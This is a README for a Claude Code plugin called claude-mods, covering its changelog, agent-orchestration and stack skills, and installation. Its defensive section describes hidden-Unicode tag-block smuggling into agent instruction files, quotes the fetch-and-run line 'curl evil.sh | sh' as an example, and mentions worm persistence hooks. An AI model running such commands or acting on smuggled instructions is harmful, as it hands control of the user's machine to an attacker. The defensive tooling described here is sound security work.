```
 ██████╗██╗      █████╗ ██╗   ██╗██████╗ ███████╗    ███╗   ███╗ ██████╗ ██████╗ ███████╗
██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██╔════╝    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
██║     ██║     ███████║██║   ██║██║  ██║█████╗      ██╔████╔██║██║   ██║██║  ██║███████╗
██║     ██║     ██╔══██║██║   ██║██║  ██║██╔══╝      ██║╚██╔╝██║██║   ██║██║  ██║╚════██║
╚██████╗███████╗██║  ██║╚██████╔╝██████╔╝███████╗    ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████║
 ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
```

[![Claude Code](https://img.shields.io/badge/Claude%20Code-plugin-blueviolet?logo=anthropic)](https://docs.anthropic.com/en/docs/claude-code)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> *Doctrine you can execute. Knowledge that knows when it's stale. Agents that land their own work.*

**claude-mods** is a Claude Code plugin built on one premise: a skill that only *tells* the model something is a suggestion, and a skill that ships a gate is a guarantee. Its 109 skills carry the expert depth you'd expect - React, Rust, PostgreSQL, Cloudflare Workers, Next.js - but the ones that earn the install are the ones that run *agents*: a headless-worker spawner, a test-gated landing queue for parallel branches, a graduated-autonomy ladder for scheduled loops, and a security layer pointed at the agent itself. 59 skills ship executable tooling, 53 ship their own test suites, and 22 carry staleness verifiers that trip when the world moves under them.

Built on the [Agent Skills specification](https://agentskills.io/specification) (an open standard backed by Anthropic, Vercel, Google, Microsoft, and 40+ agent platforms) and Anthropic's [patterns for long-running agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents), it installs as a standard plugin and toggles off as easily as it toggles on.

**3 agents. 109 skills. 13 styles. 13 hooks. 15 rules. One install.**

## Recent Updates

**v3.8.0** (August 2026)
- ♿ **`a11y-ops` skill** - accessibility as a dated legal requirement, not a quality preference. Carries the standards-and-law map (EAA supervision live since June, **ADA Title II deadlines extended to April 2027/2028** - most published advice still quotes the old dates), a four-pass audit workflow built around the fact that automated tooling finds only ~30-40% of WCAG failures, and `scan-a11y.py` as a static pre-flight with an exit-10 CI signal.
- 📊 **`evals-ops` skill** - the harness discipline everything else in agent engineering depends on: you cannot tune a prompt, retriever or memory layer without a measurable suite. Separates outcome / step / trajectory scoring, treats the golden set as four frozen buckets, counters the documented LLM-as-a-judge biases, and ships `judge-calibration.py`, `goldenset-audit.py` and `eval-baseline.py` - the last of which computes the noise floor a gate's threshold should sit below.
- ▲ **`nextjs-ops` skill** - the framework underneath `payloadcms-ops` finally has a skill. The server/client boundary and what crosses it, both caching models (`use cache` / `cacheComponents` alongside `unstable_cache` and `revalidateTag`), Server Actions as public endpoints, the `middleware.ts` → `proxy.ts` move, and self-hosting beyond Vercel. Audit rules gate on the project's detected major, not the newest one.
- 🎨 **`icon-ops` skill** - sourcing, vetting and shipping SVG icons and brand marks. The licence traps that actually bite (a mark is a trademark whatever the file licence says; aggregators hide which set's terms apply), `currentColor` theming, the delivery matrix, and the two accessibility cases. `normalize-icon.py` refuses to flatten a multi-colour mark by default, namespaces internal ids, and strips active content before you inline someone else's SVG.
- 🧠 **Context engineering in `claude-api-ops`** - the discipline that replaced prompt engineering: the window as a budget across three tiers (in-context / on-disk / retrieved). The counter-intuitive part is measured - under modern prompt caching, keeping full history beats summarisation on cost, latency *and* recall at once, so compaction is a response to a named constraint rather than a reflex.
- ⏱️ **`loop-ops` meets native scheduling** - "native primitives schedule; loop-ops governs", the same repositioning `fleet-ops` took against agent teams. `CronCreate`, the scheduled-tasks surface and `/loop`'s dynamic mode now own the plumbing the skill used to teach you to build. What it keeps is the part none of them provide: the L1→L3 risk ladder, the budget spine, the kill switch and the escalation gate.
- 🪟 **`windows-ops` gains steady-state triage** - every trigger was boot- or crash-scoped, so a workstation pinned by already-running processes never routed here. `process-triage.ps1` measures **rate, not lineage** - the expensive case is a hung process whose parent is perfectly healthy, invisible to every orphan scan. It resolves the calling session's own ancestry and marks it protected, because the failure it prevents is an agent killing the chain it runs in.

**v3.7.0** (August 2026)
- 🆕 **`hono-ops` skill** - Hono v4 on Cloudflare Workers, distilled from a production multi-tenant Worker: composition and typed bindings, `zValidator` request validation, RPC, streaming, `onError` discipline, and testing under `vitest-pool-workers` - the companion piece to `cloudflare-ops`' runtime layer.
- 🎨 **`rembg-ops` skill** - transparent-PNG cutouts for flat illustration, sticker, and avatar art. A deterministic fallback ladder carries on where rembg's ML models fail on non-photographic input, so a batch job degrades predictably instead of silently mangling half the set.
- 🔍 **`repo-doctor` skill + `agentic-quality` rule** - the cold-agent doctrine, enforced: a read-only auditor scores any repo on entry docs, guard comments, structure, gates, and doc-pairing (`--json` + `--strict` for CI), paired with the rule that makes the doctrine binding on every task.
- 🌳 **fleet-ops landing wave** - the landing queue got session-aware: a live-owner gate (with a self-ownership exemption), a `MAIN` role for the integration checkout, `fleet prune` for stale worktree housekeeping, and a gate that now *refuses* to land when its test command is unarmed rather than passing vacuously.
- 📚 **Battle-tested reference wave** - production-mined depth for four skills: `sqlite-ops` D1 patterns (migrations that time out but apply, `.batch()` semantics, Sessions-API read replication), `cloudflare-ops` Workers runtime gotchas, `typescript-ops` TS 7 native-compiler adoption, and `auth-ops` Cloudflare Access + Better Auth.
- 🔄 **fleetflow extracted** - the heterogeneous-fleet skill (GLM / Codex / Grok / Anthropic workers) outgrew a skill directory and moved to [its own repo](https://github.com/0xDarkMatter/fleetflow), staying mounted as a skill via junction. An app with a dashboard and roadmap is a product, not a skill resource.

**v3.6.0** (July 2026)
- 🎨 **`svg-brand-tint-ops` skill** — a zero-dependency in-browser SVG studio. Recolour any SVG to a brand palette via a token-driven **tri-tone** (`feColorMatrix` desaturate → `feComponentTransfer` grey-ramp remap → theme-aware CSS-filter bake), plus a from-scratch raster **vectoriser** (PNG → SVG) built on a **Potrace-paper geometry stage** — tolerance-tube straightness, penalty-DP optimal polygon, sub-pixel vertex adjustment, and alphamax corner analysis, reimplemented from the freely published Selinger 2003 paper (no GPL code) — over soft-field marching-squares with **alpha-aware palette handling** (matte de-blending, anti-alias fringe cull, blend-veto) that keeps flat-colour brand logos crisp. B&W / posterised / colour trace modes, a photographic filter stack, curated Google Fonts on SVG `<text>`, element hover-inspect, before/after split, and palette-from-image. Ships a ~90-line dependency-free static server (`scripts/server.mjs`), a headless trace CLI (`scripts/trace.mjs`) sharing one canonical engine with the browser tool (`assets/trace-core.mjs`, no drift), a colour-math + trace + theme-bake reference, and a 22-assertion offline test suite.

**v3.5.0** (July 2026)
- 📐 **`isometric-ops` skill** — isometric illustrative assets end to end: creation, refinement, composition, and export for websites and games. **14 references** anchor the exact projection math (true isometric 30° vs **2:1 dimetric 26.565°** — the mislabel that breaks tilesets — with every constant derived and machine-checked by a §7 staleness verifier), coordinate transforms + y-sort depth doctrine, the tile-spec discipline, SVG/CSS/three.js generation, Aseprite pixel-art workflow, dual Blender ortho rigs (60° dimetric vs 54.736° true iso), engine tilemaps (Godot 4 / Unity / Phaser 3), and the full AI pipeline — Recraft/Midjourney/Flux+LoRA generation under **ControlNet depth/MLSD structure control**, upscale + vectorization ladders, and licence discipline that checks AI-training clauses. Scripts: `iso-math.py` (constants/transforms/grid generator), `tile-validate.py` (AI-tile QA: halo, bleed, anchor, palette), `sheet-pack.py` (spritesheet + atlas). Headlined by **iso-studio** — a zero-dependency browser scene composer with snap-to-grid staging, footprint-aware y-sort, docked control palettes, PNG/SVG/scene-JSON export, and a blockout mode that exports **depth + lineart maps straight into ControlNet conditioning** — built alongside the skill and extracted to its own repo, `iso-studio` (not yet published) (an app with a roadmap and asset library is a product, not a skill resource).

**v3.4.0** (June 2026)
- 📊 **`r-ops` skill** — the set's first data-science skill: a tidyverse-first, current-best-practice reference for modern R (2024+). `SKILL.md` routes an import → tidy → transform → visualize → model → communicate workflow across **9 reference files (~115 KB)** — tidyverse-core, import-io, strings-dates-factors, visualization, iteration-functional, modeling-stats, data-table, time-series, workflow-tooling. Leads with current idioms (native `|>`, dplyr `.by=`, the `\(x)` lambda, `across()`, `list_rbind`, `slice_*`, tidymodels, the tidyverts `tsibble`/`fable` stack, Quarto + renv) and names base R / `data.table` where they win. Ships a 43-assertion offline self-test plus a `check-r-facts.py` §7 staleness verifier (`--offline` asserts every catalogued CRAN package is still named in the prose and the currency note carries a year; `--live` resolves each package on CRAN) so the modern-stack claim is **machine-enforced, not asserted**. Salvaged and freshened from the stale stacked PR #6 (which also duplicated the already-shipped supply-chain-defense), re-landed clean off current `main`.

**v3.3.0** (June 2026)
- 🔁 **`loop-ops` skill** — the *outer-loop* design discipline: how to design and **safely** run scheduled, autonomous agent loops — the orchestration layer above [`iterate`](skills/iterate/) (which drives a single inner run). Its backbone is a **graduated-autonomy risk ladder** (L1 report → L2 assisted → L3 unattended) mapped onto Claude Code's *actual* permission model, so a loop only ever gets the authority it has earned — anchored by the rule that **a scheduler invokes `claude -p`, never a session spawning ungated children**. Ships a **13-pattern morphology** — `trigger` (cadence · event-driven Channels · `/goal` run-to-completion) × `posture` (L1–L3) × `locus` (connector→cloud routine · local→Desktop task) — plus a STATE/run-log/budget spine, multi-loop coordination, and a kill switch. Three tools do the work: **`loop-scaffold`** seeds a near-ready loop, **`loop-check`** refuses a green light on an unbounded scope / missing gate / undefined escalation, and **`loop-estimate`** gives caching-aware cost/month before you commit to a cadence. Composes `fleet-worker` (spawn) and `fleet-ops` (land).

**v3.2.0** (June 2026)
- 🤖 **`fleet-worker` skill** — delegate tool-using, multi-step tasks to *cheaper headless Claude Code workers* — a cheaper Anthropic model (Sonnet/Haiku) or any Anthropic-compatible endpoint (e.g. GLM 5.2 via z.ai) — while an Opus orchestrator fans them out in parallel and gates their results before anything lands. Each worker is a real `claude -p` with Claude Code's full tool harness (Read/Write/Edit/Bash/Glob/Grep/Task) and any skills you provision into it, but a cheaper brain — isolated in its own git worktree + `CLAUDE_CONFIG_DIR`. Ships bash + PowerShell launchers, a result-gating collector, an endpoint health verifier, and the fleet-ops handoff recipes. fleet-worker is the **spawn** layer; [`fleet-ops`](skills/fleet-ops/) is the test-gated **landing** layer it hands winning branches to. Provider-agnostic.

[View full changelog →](CHANGELOG.md)

## Why claude-mods?

Every skill collection promises "expert knowledge on demand". Most deliver a markdown file. The model reads it, and whether it *does* anything with it is a matter of hope.

claude-mods starts from a different premise: **doctrine you can execute.** The skills that matter here don't just describe a discipline - they ship the script that enforces it, the test that proves it, and the companion rule that makes it binding on every task. Four pillars carry the weight.

### 1. It operates agents, not just frameworks

The catalogue's centre of gravity is a layer most toolkits don't have at all - skills for *running agents*, composed into a lifecycle:

| Layer | Skill | What it actually does |
|---|---|---|
| **Spawn** | [`fleet-worker`](skills/fleet-worker/) | A cheap headless `claude -p` - GLM via z.ai, or Sonnet/Haiku - with Claude Code's full tool harness, isolated in its own git worktree and `CLAUDE_CONFIG_DIR` so it can't reach your credentials |
| **Land** | [`fleet-ops`](skills/fleet-ops/) | A sequential, test-gated landing queue for parallel branches. It *refuses* to land when its test command is unarmed rather than passing vacuously, and detects a live peer writer before it touches a checkout |
| **Govern** | [`loop-ops`](skills/loop-ops/) | The L1 → L3 risk ladder for scheduled and autonomous loops. `loop-check` refuses a green light on an unbounded scope, a missing gate or an undefined escalation - a loop with no kill switch doesn't get scheduled |
| **Improve** | [`iterate`](skills/iterate/) | Karpathy-style single-metric autoresearch: modify, measure, keep or discard, with git as memory and bisect-on-regression |

Native primitives spawn; claude-mods lands. That positioning - against agent teams, background agents and `CronCreate` alike - is deliberate. The plumbing belongs to the platform; the *discipline* is what a toolkit adds.

### 2. It defends the agent, not just the code

An agent that installs packages, reads web pages and edits its own settings has an attack surface no linter covers. Three skills and their companion rules close it:

- [`supply-chain-defense`](skills/supply-chain-defense/) - behavioural-first, because CVE tools report yesterday's known-bad and the 2026 worm family publishes and self-propagates inside the window *before* an advisory exists. A 7-day cooldown gate, Socket.dev scoring, and a self-integrity scan for persistence hooks written into Claude Code's own settings.
- [`prompt-injection-defense`](skills/prompt-injection-defense/) - hidden-Unicode hygiene for instruction files. A `U+E0000` tag-block run can encode `curl evil.sh | sh` and render as nothing; the scanner reads bytes, not glyphs, and the pre-commit hook refuses to let one in.
- [`push-gate`](skills/push-gate/), [`worktree-boundaries`](rules/worktree-boundaries.md) and [`release-review`](rules/release-review.md) - the blast-radius rules. Secrets never leave, other sessions' worktrees are never touched, releases are never auto-published.

### 3. Its knowledge knows when it's stale

A skill that says "modern R" or "Hono v4" is making a claim that will be false within a year. claude-mods makes those claims **machine-checked**: 22 skills ship a `check-*-facts` verifier with an `--offline` mode (does the prose still match the catalogue?) and a `--live` mode (does the catalogue still match the world?). CI runs the first on every push; a scheduled workflow runs the second every Monday. When TypeScript ships a native compiler or ADA deadlines move, a tripwire fires instead of a reference quietly rotting.

The same instinct runs through the tooling: 59 skills ship real scripts, 53 ship their own `tests/run.sh`, 44 gates use exit-10 as a machine-readable findings signal, and 5.6 MB of references load progressively - ~100 tokens per skill until one is relevant.

### 4. The stacks are fuel, not filler

A model's training freezes on a date. Frameworks don't. So the agent writes `middleware.ts` after Next.js moved to `proxy.ts`, reaches for `unstable_cache` when `use cache` has shipped, and assumes `tsc` semantics from before the native compiler - fluently, confidently, and at scale. A human developer hesitates and checks. An agent doesn't. That's the specific way stale knowledge is worse in agentic work than in ordinary work, and it's the problem the stack skills exist to solve.

Each one is a **currency layer over the model's priors** - React, Vue, Next.js, TypeScript, Go, Rust, Laravel, Payload, Hono, Cloudflare Workers, PostgreSQL, SQLite/D1, Terraform and the rest - and they're built to be trusted by an agent, not read by a human:

- **Production-mined, not tutorial-shaped.** 200 KB on SQLite/D1 carries the migration that times out but applies and the `.batch()` semantics that bite; 152 KB on Postgres; 104 KB on TypeScript's TS 7 adoption path; `hono-ops` distilled from a live multi-tenant Worker. The gotchas the docs don't mention are the ones an agent walks straight into.
- **Version-aware, not newest-wins.** `nextjs-ops`' audit reads the project's installed major and gates its rules on *that* - it won't demand a v16 idiom of a v14 codebase. A skill that only knows the latest is a liability on any repo older than a month.
- **Pinned and verified.** Eleven stack skills carry an `assets/*-facts.json` with an `as_of` date, and pillar 3's verifiers check it against the world. The claim "modern TypeScript" is machine-enforced, not asserted.
- **Nearly free to carry.** ~100 tokens per skill until one triggers, then references load on demand. 109 skills cost roughly 10k tokens of descriptions; the 5.6 MB behind them costs nothing until you're actually in that stack.

And the payoff loops back to pillar 1. A `fleet-worker`'s isolated config dir starts clean - you *provision* skills into it. A GLM worker with `hono-ops` loaded writes better Hono than GLM alone, which is why the skill's own docs call provisioning *"often the cheapest way to lift a weak model's output on a specialized task."* The stack skills are what turn "a cheaper brain" from a cost-cut into a real option: the discipline layers decide *what* an agent may do, and the stack layers decide whether what it does is any good.

Around all of that: `/save` + `/sync` session continuity that's git-trackable across machines, a modern-CLI rule set (`rg`, `fd`, `uv`, `sd` - 10-100x faster and far cleaner in a context window), and a web-fetch fallback chain that doesn't give up at the first 403.

### The ecosystem

Some things outgrew a skill directory. An app with a dashboard and a roadmap is a product, not a skill resource - so they became repos, and stay wired in:

| Project | What it is | How it fits |
|---|---|---|
| [**fleetflow**](https://github.com/0xDarkMatter/fleetflow) | Heterogeneous cross-provider fleets - GLM, Codex, Grok, Pi and Anthropic models as OS-process workers, with adversarial cross-model verification, journalled resume and a machine-wide dashboard | The layer above `fleet-worker` when you want *different* models per work class. Still mounts as a skill. |
| [**conclave**](https://github.com/0xDarkMatter/conclave) | A universal remote for LLMs - one syntax for any model, or all of them in parallel with a judge synthesising the verdict | The second-opinion engine. When one model's answer isn't enough, convene the council. |
| [**flarecrawl**](https://github.com/0xDarkMatter/flarecrawl) | Cloudflare Browser Rendering as a Firecrawl alternative, cost-efficient at scale | A cheaper engine for the anti-bot tier of the web-fetch hierarchy - Browser Rendering pricing instead of a per-page SaaS bill. |

## Structure

```
claude-mods/
├── .claude-plugin/     # Plugin metadata
├── agents/             # Expert subagents (3)
├── commands/           # Slash commands (3)
├── skills/             # Custom skills (109)
├── output-styles/      # Response personalities
├── hooks/              # Hook examples & docs
├── rules/              # Claude Code rules
├── tools/              # Modern CLI toolkit installers
├── scripts/            # Plugin install scripts
├── tests/              # Test suites + justfile
├── docs/               # Project docs
└── templates/          # Extension templates
```

## Installation

### Plugin Install (Recommended)

```bash
# Step 1: Add the marketplace
/plugin marketplace add 0xDarkMatter/claude-mods

# Step 2: Install the plugin
/plugin install claude-mods@0xDarkMatter-claude-mods
```

This installs globally (available in all projects). Toggle on/off with `/plugin` menu.

### Script Install

```bash
git clone https://github.com/0xDarkMatter/claude-mods.git
cd claude-mods
bash scripts/install.sh
```

Works on Linux, macOS, and Windows (Git Bash). A PowerShell alternative is also available at `scripts/install.ps1`.

The install scripts:
- Copy commands, skills, agents, rules, output styles to `~/.claude/`
- Clean up deprecated items (e.g., old `/conclave` command)
- Remove renamed skills (e.g., `-patterns` -> `-ops`)
- Handle command→skill migrations (won't create duplicates)
- Preserve any extra skills installed separately (e.g., project-specific skills)

`scripts/install.ps1` additionally refuses to run from a tree that is behind
`main` on paths it installs, since that would silently revert work another branch
already landed (`-Force` overrides). `.\scripts\install.ps1 -Doctor` reports,
read-only, what differs between the repo and `~/.claude` — stale, missing, and
orphaned files — and exits non-zero when it finds any. Both comparisons ignore
line endings.

### CLI Tools (Optional)

Install modern CLI tools (fd, rg, bat, etc.) for better performance:

```bash
# Windows (Admin PowerShell)
.\tools\install-windows.ps1

# Linux/macOS
./tools/install-unix.sh
```

## Skill Architecture

All skills comply with the [Agent Skills specification](https://agentskills.io/specification) and follow a consistent structure:

```
skill-name/
├── SKILL.md              # Core workflow (< 500 lines)
├── scripts/              # Executable code (optional)
├── references/           # Documentation loaded as needed (optional)
└── assets/               # Output templates/files (optional)
```

**Progressive Loading:**
1. Metadata (name + description) - Always in context (~100 words)
2. SKILL.md body - Loaded when skill triggers (<5k words)
3. Bundled resources - Loaded only when Claude needs them

Skills carry the full layout by convention - a directory may sit empty until it's needed, so bundled resources always have an obvious home. In practice 93 skills ship references and 59 ship scripts.

See [skill-creator](skills/skill-creator/) for the complete guide.

## What's Included

### Commands

| Command | Description |
|---------|-------------|
| [sync](commands/sync.md) | Session bootstrap - restore tasks, plan, git/PR context. Suggests `--resume` and `--from-pr`. |
| [save](commands/save.md) | Persist tasks, plan, git/PR context, and session summary to native memory. |

### Skills

#### Language & Framework Skills
| Skill | Description |
|-------|-------------|
| [go-ops](skills/go-ops/) | Go concurrency, error handling, testing, interfaces, generics, project structure |
| [rust-ops](skills/rust-ops/) | Rust ownership, async/tokio, error handling, traits, serde, ecosystem |
| [typescript-ops](skills/typescript-ops/) | TypeScript type system, generics, utility types, strict mode, Zod |
| [javascript-ops](skills/javascript-ops/) | JavaScript/Node.js async patterns, modules, ES2024+, runtime internals |
| [r-ops](skills/r-ops/) | Modern R - tidyverse-first data analysis, dplyr/tidyr wrangling, ggplot2, stats/modeling (broom, tidymodels), data.table, time series, renv/Quarto workflow |
| [react-ops](skills/react-ops/) | React hooks, Server Components, state management, performance, testing |
| [nextjs-ops](skills/nextjs-ops/) | Next.js 16 App Router operations - the server/client module-graph boundary, both caching models (previous-model layers vs Cache Components `use cache`/`cacheLife`/`cacheTag`), Server Actions as public endpoints, streaming + Suspense cost, `proxy.ts` and Edge-runtime gaps, self-hosting/multi-instance/Cloudflare deployment, 14->15->16 upgrade deltas, fonts/scripts/bundle optimization, testing (async Server Components are E2E-only), and a landmines section; 16-rule version-gated app-router auditor + staleness verifier |
| [rembg-ops](skills/rembg-ops/) | Transparent-PNG cutouts / background removal for flat illustration, sticker, cartoon and avatar art - rembg (isnet-anime) plus a deterministic fallback ladder (flat-bg colour-key, alpha-binarise, colour-aware offset-shadow strip) for the pale/translucent/baked-shadow cases ML drops; auto method + contact-sheet triage |
| [vue-ops](skills/vue-ops/) | Vue 3 Composition API, Pinia, Vue Router, Nuxt 3 |
| [astro-ops](skills/astro-ops/) | Astro islands, content collections, rendering strategies, deployment |
| [laravel-ops](skills/laravel-ops/) | Laravel Eloquent, architecture, authentication, testing with Pest |
| [craftcms-ops](skills/craftcms-ops/) | Craft CMS 3/4/5 agency builds - Matrix-as-entries, Twig + escaping, eager loading, SEOmatic, Blitz, Formie, CKEditor, craft-vite, DDEV, Codeception, upgrades, performance |
| [payloadcms-ops](skills/payloadcms-ops/) | Payload CMS 3 (Next.js-native) - collections/globals, Local API, access control, hooks, fields |
| [hono-ops](skills/hono-ops/) | Hono v4 on Cloudflare Workers - app composition + sub-app mounting, middleware ordering/auth boundaries, typed errors + onError, zValidator vs hand-rolled validation, SPA co-serving, hc RPC vs typed clients, vitest-pool-workers testing, streaming/SSE/WebSockets; route-inventory + middleware-order linter, staleness verifier |
| [cli-ops](skills/cli-ops/) | Production CLI tool patterns - agentic workflows, stream separation, exit codes |
| [bash-ops](skills/bash-ops/) | Defensive Bash - strict mode, traps, safe argument parsing, semantic exit codes, shellcheck, CI scripts |
| [cypress-ops](skills/cypress-ops/) | Cypress e2e + component testing - data-test selectors, cy.intercept, cy.session, Test Replay, flake diagnosis |
| [tailwind-ops](skills/tailwind-ops/) | Tailwind CSS patterns, v4 migration, components, configuration |
| [a11y-ops](skills/a11y-ops/) | Web accessibility end to end - WCAG 2.2 conformance and the legal map (EAA supervision from 2026, ADA Title II deadlines extended to 2027/2028), the four audit passes and what each can actually detect (automation finds ~30-40%), the twelve recurring failures with class-level fixes, an honest accessibility-statement template, and a server-rendered Craft CMS/Twig reference (headings across partials, asset alt text, Formie/CKEditor markup, multi-site `lang`, axe/pa11y-ci against DDEV); `scan-a11y.py` static pre-flight over HTML/JSX/Vue/Svelte/Astro with exit-10 CI signal |
| [color-ops](skills/color-ops/) | Color spaces, WCAG/APCA contrast checker, palette + harmony generators, CSS color functions, design tokens, color converter |
| [icon-ops](skills/icon-ops/) | SVG icons for web UI end-to-end - set selection (grid/family/stroke-width lock-in), licence and trademark traps (brand marks are not cleared by a CC0 file licence; aggregators hide the originating set), currentColor theming, sprite vs inline vs component delivery, the external-`<use>` CORS trap, and the two accessibility cases; `normalize-icon.py` strips vendor cruft and rebinds paints (`--check` as a CI gate, `--symbol` for sprite assembly) |
| [figma-ops](skills/figma-ops/) | Router + composition pipeline for the official Figma MCP - which of the ~65 Figma skills/tools to load for a job, multi-account routing (one MCP server per Figma org), and a scripted capture→curate→compose flow for moodboards and reference boards: `stage-assets` (slugs + true dimensions, `vetted:false` by construction) → `plan-layout` (grid / plus / loose-plus, seeded jitter, overlap budget) → `emit-placement` (generates the exact `use_figma` scripts; refuses unvetted images) → `verify-board` (read-back vs plan: 400×300 frames, drift, z-order, budget) → screenshot; `verify-freshness` trips when the router names a plugin skill that no longer exists |
| [genart-ops](skills/genart-ops/) | Generative art - three.js scenes, p5.js sketches, SVG generation, GLSL shaders, procedural algorithms, colour theory |
| [threejs-ops](skills/threejs-ops/) | App/game-scale three.js - import maps + ES-module reality, GLTF pipeline (DRACO/KTX2/meshopt, gltf-transform), AnimationMixer crossfades, fixed-timestep loops, rapier/cannon-es physics, R3F + drei, InstancedMesh/LOD/disposal discipline, boids/steering actors; npm staleness verifier |
| [mapbox-ops](skills/mapbox-ops/) | Advanced Mapbox GL JS (web v3) - custom markers, thematic dataviz, 3D/terrain, cinematic camera, style composition, expressions, performance, gotchas; headless Playwright map verifier |
| [isometric-ops](skills/isometric-ops/) | Isometric asset creation end-to-end - exact projection math (true iso vs 2:1 dimetric), SVG/CSS/three.js generation, pixel-art + Blender pre-render pipelines, engine tilemaps, AI generation with ControlNet structure control, tile QA + atlas packing scripts; routes to the companion `iso-studio` (not yet published) scene composer (snap-to-grid, y-sort, blockout-to-ControlNet export) |
| [svg-brand-tint-ops](skills/svg-brand-tint-ops/) | Zero-dep in-browser SVG studio - token-driven tri-tone brand recolour (feColorMatrix/feComponentTransfer + theme-aware CSS-filter bake) and a from-scratch raster vectoriser (PNG->SVG) with a Potrace-paper geometry stage (straightness/optimal-polygon/vertex-adjust/alphamax, no GPL code) over soft-field marching squares with alpha-aware palette handling; curated Google Fonts, filter stack, dependency-free server + headless trace CLI sharing one engine |
| [unfold-admin](skills/unfold-admin/) | Django Unfold admin theme - ModelAdmin, dashboards, filters, widgets, theming |

#### Python Skills
| Skill | Description |
|-------|-------------|
| [python-async-ops](skills/python-async-ops/) | asyncio concurrency, aiohttp, error handling, sync/async mixing, production patterns |
| [python-cli-ops](skills/python-cli-ops/) | Click/Typer/argparse CLIs, stream handling, packaging |
| [python-database-ops](skills/python-database-ops/) | SQLAlchemy async, connection pooling, transactions |
| [python-fastapi-ops](skills/python-fastapi-ops/) | FastAPI dependency injection, background tasks, Pydantic |
| [python-observability-ops](skills/python-observability-ops/) | Structured logging, tracing, metrics for Python services |
| [python-pytest-ops](skills/python-pytest-ops/) | pytest fixtures, parametrization, property-based testing |
| [python-typing-ops](skills/python-typing-ops/) | Advanced generics, type narrowing, runtime validation |

#### Data & API Skills
| Skill | Description |
|-------|-------------|
| [api-design-ops](skills/api-design-ops/) | REST, gRPC, GraphQL design patterns, versioning, auth, rate limiting |
| [rest-ops](skills/rest-ops/) | HTTP methods, status codes, REST quick reference |
| [sql-ops](skills/sql-ops/) | CTEs, window functions, JOIN patterns, indexing |
| [postgres-ops](skills/postgres-ops/) | PostgreSQL operations, optimization, schema design, replication, monitoring |
| [sqlite-ops](skills/sqlite-ops/) | Engine-agnostic SQLite: query plans, covering indexes, WAL/locking, schema, FTS5/JSON, hosts (Python, node:sqlite, better-sqlite3, Bun, D1, libSQL) |
| [claude-api-ops](skills/claude-api-ops/) | Build on Claude - Messages API, tool use, prompt caching, structured outputs, batches, Agent SDK |
| [mcp-ops](skills/mcp-ops/) | MCP server development, FastMCP, transports, tool design, testing |

#### Infrastructure Skills
| Skill | Description |
|-------|-------------|
| [docker-ops](skills/docker-ops/) | Dockerfile best practices, multi-stage builds, Compose, optimization |
| [ci-cd-ops](skills/ci-cd-ops/) | GitHub Actions, release automation, testing pipelines |
| [container-orchestration](skills/container-orchestration/) | Kubernetes, Helm, pod patterns |
| [nginx-ops](skills/nginx-ops/) | Nginx reverse proxy, SSL/TLS, load balancing, performance tuning |
| [cloudflare-ops](skills/cloudflare-ops/) | Cloudflare Workers/Pages - wrangler (deploy, jsonc config), bindings (KV/D1/R2/DO/Queues/AI), edge deploy + CI |
| [auth-ops](skills/auth-ops/) | JWT, OAuth2, sessions, RBAC/ABAC, passkeys, MFA |
| [monitoring-ops](skills/monitoring-ops/) | Prometheus, Grafana, OpenTelemetry, structured logging, alerting |
| [debug-ops](skills/debug-ops/) | Systematic debugging, language-specific debuggers, common scenarios |
| [perf-ops](skills/perf-ops/) | Performance profiling - CPU, memory, bundle analysis, load testing, flamegraphs |
| [web-perf-ops](skills/web-perf-ops/) | Frontend page speed - Core Web Vitals (LCP/INP/CLS) field-vs-lab method, report triage script, image/font/JS/CSS/caching fixes, Lighthouse CI budgets, Craft CMS levers, threshold staleness verifier |
| [terraform-ops](skills/terraform-ops/) | Terraform/OpenTofu IaC - state management, module patterns, OIDC CI/CD, drift detection, secrets |
| [supply-chain-defense](skills/supply-chain-defense/) | Behavioural-first dependency security - Socket.dev (free CLI + depscore MCP), exposure-check (IOC match across npm/pnpm/yarn/bun/PyPI/Composer/Cargo/Go/RubyGems + extensions), integrity-audit (worm persistence), scan-extensions, install/manifest hooks |
| [prompt-injection-defense](skills/prompt-injection-defense/) | Instruction-integrity defense - hidden Unicode scanning (bidi/Trojan Source, tag-block smuggling, zero-width), content sanitization, trust-boundary doctrine |
| [security-ops](skills/security-ops/) | Reactive security auditing - 3 parallel agents (dependency CVEs, SAST patterns, auth/config review) consolidated into OWASP-mapped report; PHP 8, Twig and Craft CMS references (CSRF, allowAnonymous, devMode, GraphQL, uploads, advisories, DDEV drift) |
| [portless-ops](skills/portless-ops/) | Local-dev HTTPS proxy operations for Vercel Labs' portless - TLD selection, supervisor pairing, Windows gotchas |
| [process-compose-ops](skills/process-compose-ops/) | Process Compose supervisor operations - YAML schema, readiness probes, dependency patterns, boot persistence |
| [pypi-ops](skills/pypi-ops/) | PyPI publishing - OIDC Trusted Publishing + PEP 740 attestations, the pending-publisher first-publish fix (`invalid-publisher`), preflight/diagnose/pin-verifier scripts, hardened `publish.yml`, uv & twine local paths |

#### Workstation & Network Diagnostics
| Skill | Description |
|-------|-------------|
| [windows-ops](skills/windows-ops/) | Windows workstation diagnostics - health audit, crash triage, drive mapping, dying-drive recovery |
| [mac-ops](skills/mac-ops/) | macOS workstation diagnostics - TCC privacy permissions, wake reasons, Spotlight, APFS storage pressure |
| [net-ops](skills/net-ops/) | Cross-platform network troubleshooting - layered ladder from link to app, IPv6 classifier, DoH detection, MTU/PMTU |
| [asus-router-ops](skills/asus-router-ops/) | Asus / Asuswrt-Merlin routers - hardening, WireGuard/OpenVPN, segmentation, DNS privacy, JFFS scripting |

#### CLI Tool Skills
| Skill | Description |
|-------|-------------|
| [file-search](skills/file-search/) | Find files with fd, search code with rg, select with fzf |
| [find-replace](skills/find-replace/) | Modern find-and-replace with sd |
| [code-stats](skills/code-stats/) | Analyze codebase with tokei and difft |
| [data-processing](skills/data-processing/) | Process JSON with jq, YAML/TOML with yq |
| [markitdown](skills/markitdown/) | Convert PDF, Word, Excel, PowerPoint, images to markdown |
